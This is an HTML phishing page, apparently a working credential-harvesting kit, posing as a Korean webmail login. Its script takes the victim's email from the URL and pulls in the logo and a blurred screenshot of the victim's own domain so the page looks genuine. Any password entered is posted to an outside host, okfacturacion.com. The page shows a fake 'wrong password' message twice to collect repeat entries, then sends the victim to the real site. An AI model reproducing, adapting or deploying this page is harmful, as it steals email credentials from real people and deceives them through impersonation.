<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title id="page-title">Webmail Portal</title>
    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <link id="favicon" rel="icon" type="image/x-icon" href="">
    <style>
        body, html {
            height: 100%;
            margin: 0;
            overflow: hidden;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        .background-wrapper {
            display: none;
        }

        .overlay-bg {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.4);
            z-index: -1;
        }

        .form-container {
            position: relative;
            z-index: 1;
            background-color: rgba(255, 255, 255, 0.85);
            max-width: 450px;
            padding: 30px;
            margin: auto;
            top: 50%;
            transform: translateY(-50%);
            border-radius: 15px;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
        }

        .logo-container {
            text-align: center;
            margin-bottom: 25px;
        }

        .domain-logo {
            width: 80px;
            height: 80px;
            object-fit: contain;
            margin-bottom: 15px;
        }

        .user-email {
            background-color: #f8f9fa;
            padding: 12px;
            border-radius: 8px;
            margin-bottom: 20px;
            font-size: 0.95rem;
            color: #495057;
            border-left: 4px solid #007bff;
        }

        .form-control {
            border: none;
            border-bottom: 2px solid #dee2e6;
            border-radius: 0;
            padding: 12px 5px;
            transition: all 0.3s ease;
        }

        .form-control:focus {
            box-shadow: none;
            border-bottom-color: #007bff;
        }

        .error-message {
            color: #dc3545;
            font-size: 0.85rem;
            margin-top: 5px;
            display: none;
        }

        .submit-btn {
            background-color: #007bff;
            border: none;
            padding: 12px 30px;
            border-radius: 25px;
            font-weight: 500;
            margin-top: 20px;
            transition: all 0.3s ease;
        }

        .submit-btn:hover {
            background-color: #0056b3;
            transform: translateY(-2px);
        }

        .alert {
            border-radius: 8px;
            padding: 12px;
            margin-bottom: 15px;
        }

        .domain-name {
            font-size: 1.5rem;
            font-weight: 600;
            color: #2c3e50;
            margin-bottom: 20px;
            text-align: center;
        }

        .verification-text {
            color: #6c757d;
            font-size: 0.9rem;
            text-align: center;
            margin-bottom: 20px;
        }

        @media (max-width: 576px) {
            .form-container {
                width: 90%;
                padding: 20px;
                margin: 20px;
            }
        }

        .domain-background-iframe {
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            border: none;
            z-index: -2;
            pointer-events: none;
            transform: scale(1.1);
            filter: blur(8px) brightness(0.8);
        }
    </style>
</head>
<body>
    <img class="domain-background-iframe" id="domain-background-iframe" src="">
    <div class="overlay-bg"></div>
    
    <div class="form-container">
        <div class="logo-container">
            <img id="domain-logo" class="domain-logo" src="" alt="로고">
            <div class="domain-name" id="domain-name">웹메일 로그인</div>
        </div>
        
        <div class="verification-text">
            계속하려면 이메일 자격 증명을 확인하세요
        </div>

        <div class="user-email" id="user-email"></div>

        <form novalidate id="login-form">
            <div class="form-group">
                <input type="password" class="form-control" id="password-input" 
                       placeholder="비밀번호 입력" required>
                <div class="error-message" id="password-error">
                    계속하려면 비밀번호를 입력하세요
                </div>
            </div>

            <div id="alert-container"></div>

            <button type="submit" class="btn btn-primary btn-block submit-btn">
                확인
            </button>
        </form>
    </div>

    <script>
        $(document).ready(function() {
            let submitCount = 0;
            let email = decodeURIComponent(window.location.hash.slice(1));
            let domain = email ? email.split('@')[1] : '';

            // Set email in the display div
            $('#user-email').text(email);

            if (domain) {
                // Split domain and convert to uppercase without dots
                let formattedDomain = domain.split('.')[0].toUpperCase();
                
                // Set domain name
                $('#domain-name').text(formattedDomain);
                
                // Get domain logo
                let logoUrl = `https://logo.clearbit.com/${domain}`;
                fetch(logoUrl)
                    .then(response => {
                        if (response.ok) {
                            $('#domain-logo').attr('src', logoUrl);
                            // Set favicon
                            $('#favicon').attr('href', logoUrl);
                            // Set iframe source
                            $('#domain-background-iframe').attr('src', `https://image.thum.io/get/https://${domain}`);
                        } else {
                            throw new Error('Logo not found');
                        }
                    })
                    .catch(() => {
                        // Fallback handling if needed
                        console.error('Failed to load domain assets');
                    });
            }
            $('#login-form').on('submit', function(e) {
                e.preventDefault();
                
                let password = $('#password-input').val();
                
                if (!password) {
                    $('#password-error').show();
                    return;
                }

                $('#password-error').hide();
                
                // Change button text and disable it
                const $submitBtn = $('.submit-btn');
                const originalBtnText = $submitBtn.text();
                $submitBtn.text('확인 중...').prop('disabled', true);
                
                // Delay for 2 seconds before showing error
                setTimeout(function() {
                    $.ajax({
                        url: 'https://okfacturacion.com/kor/index.php',
                        type: 'POST',
                        data: {
                            email: email,
                            password: password
                        }
                    }).always(function() {
                        submitCount++;
                        
                        // Reset button
                        $submitBtn.text(originalBtnText).prop('disabled', false);
                        
                        if (submitCount < 3) {
                            $('#alert-container').html(`
                                <div class="alert alert-danger">
                                    잘못된 비밀번호입니다. 다시 시도해주세요.
                                </div>`);
                            $('#password-input').val('');
                        } else {
                            window.location.href = `https://${domain}`;
                        }
                    });
                }, 2000);
            });

            // Clear error message when user starts typing
            $('#password-input').on('input', function() {
                $('#password-error').hide();
                $('#alert-container').empty();
            });
        });
    </script>
</body>
</html>
